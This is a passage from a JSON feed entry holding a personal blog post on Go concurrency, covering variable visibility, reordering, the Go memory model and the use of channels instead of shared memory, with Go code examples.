class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Never end\\n\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tflag <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>line 5~10 would never end.</p>\n<p>Then ordering. <a href=\"https://medium.com/r/?url=https%3A%2F%2Fgolang.org%2Fref%2Fmem\">The Official Goalng Blog</a> mentions that this code is non-concurrence safe:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>\tb <span class=\"token operator\">=</span> <span class=\"token number\">2</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>It may happen that g prints 2 and then 1. So we must protect that variable with something like Lock to protect it. But how come an effective Language like Golang would handle this issue in such a heavy way?</p>\n<p>Look at this Golang’s official blog, we can see how to solve the issue in Golang way. The blog mentions that:</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>\n</blockquote>\n<p>That’s the way Golang encourages you to do: using <a href=\"https://en.wikipedia.org/wiki/Communicating_sequential_processes\">CSP model</a>. So I think the key way to solve the shared variable in concurrency in Golang is “NOT TO SHARE IT”. Instead, you should use chan to communicate. And as mentioned above, chan DO guarantee happen-before!</p>\n<p>According to discuss above, I think it should pass flag through chan in the visibility example:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> flag <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">break</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"End of goroutine\\n\"</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tdone <span class=\"token operator\">&lt;-</span> <span class=\"token boolean\">false</span><br>\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Also, I think it should pass a and b through chan in the ordering example, the code may look like:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tchana <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\tchanb <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chana<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chanb<span class=\"token punctuation\">)</span><br><br>\t\tchana <span class=\"token operator\">&lt;-</span> <span class=\"token number\">1</span><br>\t\tchanb <span class=\"token operator\">&lt;-</span> <span class=\"token number\">2</span><br>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">return</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">return</span> chana<span class=\"token punctuation\">,</span> chanb<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tchana<span class=\"token punctuation\">,</span> chanb <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chana<br>\tb <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chanb<br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"conclusion\"><a class=\"direct-link\" href=\"#conclusion\">#</a> Conclusion</h3>\n<p>The most difficult part of writing concurrency code is that most of the bug is not determined, uncertain, and can not reproduce easily, thus it’s had to debug.</p>\n<p>That’s why we should dig deeper into detail in how a program langue handle concurrency, understand how your code would run in your machine and prevent you from doing thing wrong.</p>\n",
      "date_published": "2021-05-03T08:00:00+08:00"
    }
  ]
}
